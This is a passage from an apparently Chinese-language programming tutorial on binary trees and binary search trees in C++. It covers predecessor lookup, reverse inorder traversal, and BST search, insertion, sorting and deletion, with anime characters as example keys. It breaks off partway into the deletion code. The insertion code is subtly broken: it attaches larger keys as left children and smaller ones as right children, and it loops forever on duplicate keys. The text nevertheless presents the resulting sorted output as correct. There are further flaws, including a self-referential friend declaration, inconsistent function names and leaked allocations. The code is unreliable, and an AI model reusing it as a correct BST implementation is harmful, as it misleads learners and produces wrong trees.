flat"><p><strong>特別提醒，跟 Successor 一樣，在實作第二種狀況的時候，在特定的 Tree 會發生問題，例如只有 right subTree 的 skewed tree，整棵樹都沒有 left subTree，這時就必須回傳 NULL，代表 root 沒有 predecessor</strong></p></div><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode * <span class="title">BinaryTree::InorderPredecessor</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(current-&gt;leftchild != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Rightmost</span>(current-&gt;leftchild);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TreeNode *Predecessor = current-&gt;parent;</span><br><span class="line">    <span class="comment">// if current node is not predecessor&#x27;s right child, then keep moving back to it&#x27;s parent node.</span></span><br><span class="line">    <span class="keyword">while</span>(Predecessor != <span class="literal">NULL</span> &amp;&amp; current == Predecessor-&gt;leftchild)&#123;</span><br><span class="line">        current = Predecessor;</span><br><span class="line">        Predecessor = Predecessor-&gt;parent;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Predecesor == NULL or current node is predecessor&#x27;s right child.</span></span><br><span class="line">    <span class="keyword">return</span> Predecessor;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>透過 <code>rightmost</code> 和 <code>InorderPredecessor</code> 即可完成針對Binart Tree 的反向 Inorder Traversal。可以透過 <code>Inorder_Reverse</code> 來實現</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BinaryTree::Inorder_Reverse</span><span class="params">(TreeNode *root)</span></span>&#123;</span><br><span class="line">    TreeNode *current = <span class="keyword">new</span> TreeNode;</span><br><span class="line">    current = <span class="built_in">rightmost</span>(root);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(current)&#123;</span><br><span class="line">        std::cout &lt;&lt; current-&gt;str &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        current = <span class="built_in">InorderPredecessor</span>(current);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此時在 <code>main()</code> 中呼叫 <code>T.Inorder_Reverse(T.root)</code> 即可得到 Tree 節點的反向 Inorder 輸出 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C I F A H E G B D</span><br></pre></td></tr></table></figure><blockquote><p>完整程式碼可以看我的 <strong><a href="https://github.com/leozzmc/Leetcode/blob/main/Tree/Binary_Tree-2.cpp">GitHub</a></strong></p></blockquote><h3 id="重新建構-Binary-Tree"><a href="#重新建構-Binary-Tree" class="headerlink" title="重新建構 Binary Tree"></a>重新建構 Binary Tree</h3><!-- https://alrightchiu.github.io/SecondRound/binary-tree-jian-li-yi-ke-binary-tree.html --><p>前一篇暴力建構Binary Tree 其實是有些存取安全問題的，因為定義的 pointer 都放 <code>public</code>，目的是為了能夠讓 main存取，接下來會進行一些改動，也就是把 pointer 放入 <code>private</code> 區塊中。 </p><h1 id="Binary-Search-Tree-BST"><a href="#Binary-Search-Tree-BST" class="headerlink" title="Binary Search Tree(BST)"></a>Binary Search Tree(BST)</h1><!-- https://alrightchiu.github.io/SecondRound/binary-search-tree-searchsou-xun-zi-liao-insertxin-zeng-zi-liao.html --><!-- https://alrightchiu.github.io/SecondRound/binary-search-tree-sortpai-xu-deleteshan-chu-zi-liao.html#binary-search-tree-sortpai-xu-deleteshan-chu-zi-liao --><h2 id="甚麼是-Binary-Search-Tree"><a href="#甚麼是-Binary-Search-Tree" class="headerlink" title="甚麼是 Binary Search Tree?"></a>甚麼是 Binary Search Tree?</h2><blockquote><p>Binary Search Tree 是一種 Binary Tree，它的節點滿足一個特性的順序: 所有左子樹節點 &lt;&#x3D; n &lt; 右子樹節點，對於每個節點 n 都要成立，也就代表對節點的所有後代，這個不等式都要成立</p></blockquote><p><img src="/img/LeetCode/tree/BST.png"></p><div class="note info flat"><p>上面定義中的等式部分可能會有所不同，某些定義中樹不可以有重複值，或者重複值會位在右側，所以還是要回歸到題目定義。</p></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">對任一節點R，以其左節點為根的子樹(左子樹)的所有節點必小於R</span><br><span class="line">對任一節點R，以其右節點為根的子樹(右子樹)的所有節點必大於R</span><br><span class="line">以子樹中任一子節點為根的子樹也都符合上述定義</span><br></pre></td></tr></table></figure><p>滿足上面定義的也稱作 <strong>Normal Binary Search Tree</strong>，而具有其他特性的 BST，像紅黑樹就以後再討論。 </p><h2 id="建構-Binary-Search-Tree"><a href="#建構-Binary-Search-Tree" class="headerlink" title="建構 Binary Search Tree"></a>建構 Binary Search Tree</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BST</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        TreeNode *leftchild, *rightchild, *parent;</span><br><span class="line">        <span class="type">int</span> key;</span><br><span class="line">        string element;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">//constructor</span></span><br><span class="line">        <span class="built_in">TreeNode</span>():<span class="built_in">leftchild</span>(<span class="number">0</span>),<span class="built_in">rightchild</span>(<span class="number">0</span>), <span class="built_in">parent</span>(<span class="number">0</span>), <span class="built_in">key</span>(<span class="number">0</span>), <span class="built_in">element</span>(<span class="string">&quot;&quot;</span>) &#123;&#125;;</span><br><span class="line">        <span class="built_in">TreeNode</span>(<span class="type">int</span> a, string b):<span class="built_in">leftchild</span>(<span class="number">0</span>),<span class="built_in">rightchild</span>(<span class="number">0</span>),<span class="built_in">parent</span>(<span class="number">0</span>), <span class="built_in">key</span>(a), <span class="built_in">element</span>(b)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// main() will use these functions to access pointers in the private section</span></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">GetKey</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> key;&#125;</span><br><span class="line">        <span class="function">string <span class="title">GetElement</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> element;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">BST</span>; <span class="comment">// Can access pointers in the private section in TreeNode class</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BST</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        TreeNode *root;</span><br><span class="line">        <span class="function">TreeNode *<span class="title">leftmost</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function">TreeNode* <span class="title">Successor</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">BST</span>(): <span class="built_in">root</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="function">TreeNode * <span class="title">search</span><span class="params">(<span class="type">int</span> key)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">insertBST</span><span class="params">(<span class="type">int</span> key, string element)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">inorderPrint</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">levelorder</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">BST</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="Search"><a href="#Search" class="headerlink" title="Search"></a>Search</h2><p><img src="/img/LeetCode/tree/BST_example.png"></p><blockquote><p>上面這張圖用咒術迴戰漫畫角色為例，暫時幫他們設定戰力值 (隨意設定的，勿認真XD)</p></blockquote><h3 id="搜尋成功"><a href="#搜尋成功" class="headerlink" title="搜尋成功"></a>搜尋成功</h3><p>如果我要搜尋 <code>KEY(1250)</code> 流程會像下面一樣：</p><ul><li>首先進入BST，<code>*current</code> 會指向 root，接著將 KEY(1250) 與甚爾的戰鬥力(500) 進行比較，由於 1250 &gt; 500，因此進入 right subTree</li><li>current 移動到羂索(550)，此時進行比較: 1250 &gt; 550，因此current移動到羂索的 right subTree，也就是五條(2500)</li><li>此時進行比較: 2500 &gt; 1250，因此將current 移動到五條的 left subTree，也就是乙骨(1250)</li><li>此時再進行比較: 1250 &#x3D; 1250，發現匹配結果，確認搜尋結果為乙骨，跳出while迴圈，回傳 current 值</li></ul><h3 id="搜尋失敗"><a href="#搜尋失敗" class="headerlink" title="搜尋失敗"></a>搜尋失敗</h3><p>如果我要搜尋 <code>KEY(6)</code> 流程如下:</p><ul><li>首先進入BST，<code>*current</code> 會指向 root，接著將 KEY(6) 與甚爾的戰鬥力(500) 進行比較，由於 500 &gt; 6，因此進入 left subTree</li><li>current 移動虎杖爺爺(13)，此時進行比較: 13 &gt; 6，因此current移動到虎杖爺爺的 right subTree，也就是虎杖(12)</li><li>此時進行比較: 12 &gt; 6，因此需要將current 移動到虎杖的 left subTree，但虎杖的 left subTree 為 NULL</li><li>current為 NULL 則跳出迴圈，並回傳NULL，代表搜尋失敗</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode *<span class="title">BST::search</span><span class="params">(<span class="type">int</span> KEY)</span></span>&#123;</span><br><span class="line">    TreeNode *current = root;</span><br><span class="line">    <span class="keyword">while</span>(current!= <span class="literal">NULL</span> &amp;&amp; KEY != current-&gt;key)&#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;key &gt; KEY)&#123;</span><br><span class="line">            current = current-&gt;leftchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            current = current-&gt;rightchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Insertion"><a href="#Insertion" class="headerlink" title="Insertion"></a>Insertion</h2><p><img src="/img/LeetCode/tree/BST_insert_example.png"></p><p>接續著 Search，如果想要插入資料的話，<strong>必須要先找到適當的插入位置，再將節點連接到樹上。</strong></p><p>要找到適當的插入位置，需要兩個指標，一個負責找位置，一個指向新插入節點的Parent。</p><p>首先找位置的指標就叫 <code>*current</code>，而指向parent 的指標就先叫 <code>*parentInsert</code>，這兩個指標每次都會同步移動。</p><ul><li>首先 <code>*current</code> 進入 root 節點，此時的 <code>*parentInsert</code> 為 root 的 parent，即為NULL</li><li>此時我們要插入的角色為里香，戰鬥值為 520，所以 KEY(520) 與 <code>*current</code> 的 Key(500) 相比， 520 &gt; 500，因此里香應該會是在甚爾的 right subTree</li><li>因此將 <code>*current</code> 往甚爾的 right child 移動 (羂索)，並且 <code>*parentInsert</code> 更新為甚爾(500)</li><li>此時將里香的 Key(520) 與 羂索(550)做比較，520 &lt; 550，因此里香應該要再羂索的 left subTree</li><li>因此 <code>*current</code> 往羂索的 left child (NULL) 移動，並且 <code>*parentInsert</code> 更新為羂索(550)</li><li>由於此時的 <code>*current</code> 為 NULL，因此跳出迴圈，因為找到了適當的插入位置，即為當前 <code>*parentInsert</code> 的 child</li></ul><p>這時候僅需要判斷要插入在當前parent 的 left 還是 right child 位置，所以比較里香(520) 與 parent 羂索(550)，要插入的位置為羂索的 left child位置，因此這時候將節點新增在該位置上，如圖所示。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BST::insertBST</span><span class="params">(<span class="type">int</span> key, string element)</span></span>&#123;</span><br><span class="line">    TreeNode *current = root;</span><br><span class="line">    TreeNode *parentInsert = <span class="literal">NULL</span>;</span><br><span class="line">    TreeNode *insertNode = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(key, element);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//Find the appropriate insert position</span></span><br><span class="line">    <span class="keyword">while</span>(current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        parentInsert = current;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt; key &gt; insertNode-&gt;key)&#123;</span><br><span class="line">            current = current-&gt;leftchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(current-&gt; key &lt; insertNode-&gt;key)&#123;</span><br><span class="line">            current = current-&gt;rightchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    insertNode-&gt;parent = parentInsert;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(parentInsert == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;root = insertNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(insertNode-&gt;key &gt; parentInsert-&gt;key)&#123;</span><br><span class="line">        parentInsert-&gt;leftchild = insertNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (insertNode-&gt;key &lt; parentInsert-&gt;key)&#123;</span><br><span class="line">        parentInsert-&gt;rightchild = insertNode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以用 <code>insertBST</code> 來去建立一顆 BST Tree</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    BST T;</span><br><span class="line"></span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">500</span>,<span class="string">&quot;甚爾&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">550</span>,<span class="string">&quot;羂索&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">2500</span>,<span class="string">&quot;五條&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">48</span>,<span class="string">&quot;七海&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">1250</span>,<span class="string">&quot;乙骨&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">13</span>,<span class="string">&quot;虎杖爺爺&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">3000</span>,<span class="string">&quot;宿儺&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">70</span>,<span class="string">&quot;東堂&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">520</span>,<span class="string">&quot;里香&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">50</span>,<span class="string">&quot;帳相&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">12</span>,<span class="string">&quot;虎杖&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Test insertion method</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Inorder Traversal:\n&quot;</span>;</span><br><span class="line">    T.<span class="built_in">inorderPrint</span>();</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Test search method</span></span><br><span class="line">    TreeNode *node = T.<span class="built_in">search</span>(<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">if</span>(node != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;There is &quot;</span> &lt;&lt; node-&gt;<span class="built_in">GetElement</span>() &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; node-&gt;<span class="built_in">GetKey</span>() &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;no element with Key(1000)&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    node = T.<span class="built_in">search</span>(<span class="number">73</span>);</span><br><span class="line">    <span class="keyword">if</span>(node != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;There is &quot;</span> &lt;&lt; node-&gt;<span class="built_in">GetElement</span>() &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; node-&gt;<span class="built_in">GetKey</span>() &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;no element with Key(73)&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的 <code>inorderPrint()</code> 可以透過本篇前半部分提到的 <code>leftmost()</code> 以及 <code>Successor</code> 來實現。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode *<span class="title">BST::leftmost</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(current-&gt;leftchild != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        current = current-&gt;leftchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode *<span class="title">BST::Successor</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(current-&gt;rightchild != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">leftmost</span>(current-&gt;rightchild);</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode *SuccessorNode = current-&gt;parent;</span><br><span class="line">    <span class="comment">// if current node is succesor&#x27;s right child, then keep moving back to it&#x27;s parent node.</span></span><br><span class="line">    <span class="keyword">while</span>( SuccessorNode != <span class="literal">NULL</span> &amp;&amp; current == SuccessorNode-&gt;rightchild)&#123;</span><br><span class="line">        current = SuccessorNode;</span><br><span class="line">        SuccessorNode = SuccessorNode-&gt;parent;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Suceessor == NULL or the current node is Successor&#x27;s left child</span></span><br><span class="line">    <span class="keyword">return</span> SuccessorNode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BST::inorderPrint</span><span class="params">()</span></span>&#123;</span><br><span class="line">    TreeNode *current = <span class="keyword">new</span> TreeNode;</span><br><span class="line">    current = <span class="built_in">leftmost</span>(root);</span><br><span class="line">    <span class="keyword">while</span>(current)&#123;</span><br><span class="line">        cout &lt;&lt; current-&gt;element &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; current-&gt;key &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        current = <span class="built_in">Successor</span>(current);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我們執行程式後的輸出結果如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Inorder Traversal:</span><br><span class="line">虎杖(12) 虎杖爺爺(13) 七海(48) 帳相(50) 東堂(70) 甚爾(500) 里香(520) 羂索(550) 乙骨(1250) 五條(2500) 宿儺(3000) </span><br><span class="line">no element with Key(1000)</span><br><span class="line">no element with Key(73)</span><br></pre></td></tr></table></figure><p>這樣看起來輸出結果是正確的</p><h2 id="Sort"><a href="#Sort" class="headerlink" title="Sort"></a>Sort</h2><p>可以觀察一下前面的圖，其實上面的樹也可以看成對一棵樹進行 Inorder Traversal 後的結果。因為BST的定義  <code>L subTree &lt;= n &lt; R subTree</code> 與 Inorder <code>(L&lt;V&lt;R)</code> 順序相同。 </p><p>因此執行 <code>inorderPrint()</code> 就是以 inorder 順序對 BST 中節點依序進行 visiting</p><h2 id="Deletion"><a href="#Deletion" class="headerlink" title="Deletion"></a>Deletion</h2><p>由於刪除節點，與該節點連接的所有節點 ( <code>leftchild</code>, <code>rightchild</code>, <code>parent</code> )都會受到影響，以下歸類三種處理情境:</p><ul><li><strong>情境一: 要刪除的節點是 leaf，沒有 child pointer</strong></li><li><strong>情境二: 要刪除的節點只有一個 child (不管是 leftchild 或是 rightchild)</strong></li><li><strong>情境三: 要刪除的節點有兩個 child</strong></li></ul><h3 id="情境一"><a href="#情境一" class="headerlink" title="情境一"></a>情境一</h3><p>解決方法很簡單，就直接把 Leaf node 刪除，原本 parent 的 child pointer 指向 NULL</p><p><img src="/img/LeetCode/tree/BST_delete_1.png"></p><h3 id="情境二"><a href="#情境二" class="headerlink" title="情境二"></a>情境二</h3><p>情境二，要刪除的node有一個child，這時必須將其child的 <code>*parent</code> 指向要刪除node的 <code>*parent</code>，而parent node 的 child pointer 要指向該node的child，之後再進行刪除節點的動作</p><p>舉例來說，如果我們要把 五條(2500) 刪掉，我們就必須</p><ol><li>先把 乙骨(1250) 的 <code>*parent</code> 指向五條的 parent node 羂索(550)</li><li>把 羂索(550) 的 <code>rightchild</code> 指向 乙骨(1250)，由於乙骨本來就再羂索的 rigtht subTree，因此這麼做一樣可以維持BST</li><li>刪除 五條(2500) 這個節點</li></ol><p><img src="/img/LeetCode/tree/BST_delete_2.png"></p><h3 id="情境三"><a href="#情境三" class="headerlink" title="情境三"></a>情境三</h3><p>情境三，要刪除的node有兩個 child，影響到的node較多，但有個好方法:</p><div class="note info flat"><p><strong>與其直接刪除節點，不如釋放其 Successor 或 Predecessor 的記憶體位置，之後再拿原本 Successor 或 Predecessor 的值將待刪除節點的資料替換掉。</strong></p></div><p>舉例來說，我想要刪除帳相(50)，可以把他的 Successor 東堂(70) (或 Predecessor 七海(48)) 的記憶體位置釋放，再將Successor的資料值 東堂(70) (或 Predecessor 七海(48)) 放回帳相(50) 的記憶體位址。</p><p><img src="/img/LeetCode/tree/BST_delete_3.png"></p><p>如何實現，可以透過一個BST的特性來簡化問題，即 <strong>「具有兩個child的node，其 Successor 或 Predecessor 一定是 Leaf Node 或只有一個child 的 node」</strong>。這裡可以為這個特性舉例子驗證看看:</p><p>虎杖爺爺(13) 的 Successor是七海(48), Predecessor 是虎杖(12)<br>甚爾(500) 的 Successor是羂索(550), Predecessor 是虎杖爺爺(13)</p><blockquote><p>Successor: 找 right subTree 中的最小值<br>Predecessor: 找 left subTree 中最大值</p></blockquote><p><strong>所以這樣問題就會簡化成情境一與情境二</strong></p><h3 id="實作"><a href="#實作" class="headerlink" title="實作"></a>實作</h3><p>這裡可以在先前的 BST class 中定義一個新的成員函數</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeleteBST</span><span class="params">(<span class="type">int</span> key)</span></span>;</span><br></pre></td></tr></table></figure><p>實作DeleteBST 流程如下:</p><ol><li>先透過 <code>Search()</code>確認想要刪除的node是否存在BST中</li><li>把真正會被釋放記憶體的pointer調整成「至多只有一個child」的node</li><li>把真正會被釋放記憶體的node的child指向新的parent</li><li>把真正會被釋放記憶體的node的parent指向新的child</li><li>若真正會被釋放記憶體是「替身」，再把替身的資料放回BST中</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BST::DeleteBST</span><span class="params">(<span class="type">int</span> KEY)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    TreeNode *deleteNode = <span 